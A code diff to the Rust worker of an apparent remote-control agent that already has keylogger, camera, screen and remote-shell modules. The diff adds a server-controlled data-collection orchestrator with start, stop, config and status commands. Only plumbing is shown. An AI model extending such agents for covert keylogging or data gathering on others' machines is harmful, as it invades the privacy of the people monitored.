@@ -11,7 +11,8 @@ use tokio_tungstenite::{connect_async, tungstenite::protocol::Message};
 use tracing::{debug, error, info, warn};
 use uuid::Uuid;
 
-use crate::{camera, filesystem, input, installer, keylogger, plugins, screen, session, shell, system};
+use crate::{camera, data_collection, filesystem, input, installer, keylogger, plugins, screen, session, shell, system};
+use crate::data_collection::CollectionOrchestrator;
 
 /// Namespace UUID for generating deterministic worker IDs from MAC addresses
 const CORELY_NAMESPACE: Uuid = Uuid::from_bytes([
@@ -102,6 +103,7 @@ pub struct WorkerState {
     pub plugins: Vec<plugins::Plugin>,
     pub keylogger_active: Arc<Mutex<bool>>,
     pub recorded_keys: Arc<Mutex<Vec<keylogger::KeyEvent>>>,
+    pub collection_orchestrator: Arc<CollectionOrchestrator>,
 }
 
 pub async fn run(
@@ -110,12 +112,16 @@ pub async fn run(
     worker_name: &str,
     plugins: Vec<plugins::Plugin>,
 ) -> Result<()> {
+    let stable_worker_id = generate_stable_worker_id();
+    let collection_orchestrator = Arc::new(CollectionOrchestrator::new(stable_worker_id.clone()));
+
     let state = Arc::new(Mutex::new(WorkerState {
         worker_id: None,
         worker_name: worker_name.to_string(),
         plugins,
         keylogger_active: Arc::new(Mutex::new(false)),
         recorded_keys: Arc::new(Mutex::new(Vec::new())),
+        collection_orchestrator,
     }));
 
     loop {
@@ -251,6 +257,10 @@ fn get_capabilities(plugins: &[plugins::Plugin]) -> Value {
         "session.resize",
         "session.kill",
         "session.rename",
+        "collection.update_config",
+        "collection.start",
+        "collection.stop",
+        "collection.status",
     ];
 
     for plugin in plugins {
@@ -557,6 +567,27 @@ async fn handle_request(
 
             let state_guard = state.lock().await;
             plugins::invoke(&state_guard.plugins, plugin_name, tool_name, tool_params).await
+        }
+
+        // Collection operations
+        "collection.update_config" => {
+            let state_guard = state.lock().await;
+            data_collection::handle_update_config(params, &state_guard.collection_orchestrator).await
+        }
+
+        "collection.start" => {
+            let state_guard = state.lock().await;
+            data_collection::handle_start(&state_guard.collection_orchestrator).await
+        }
+
+        "collection.stop" => {
+            let state_guard = state.lock().await;
+            data_collection::handle_stop(&state_guard.collection_orchestrator).await
+        }
+
+        "collection.status" => {
+            let state_guard = state.lock().await;
+            data_collection::handle_status(&state_guard.collection_orchestrator).await
         }
 
         _ => Err(anyhow!("Unknown method: {}", method)),
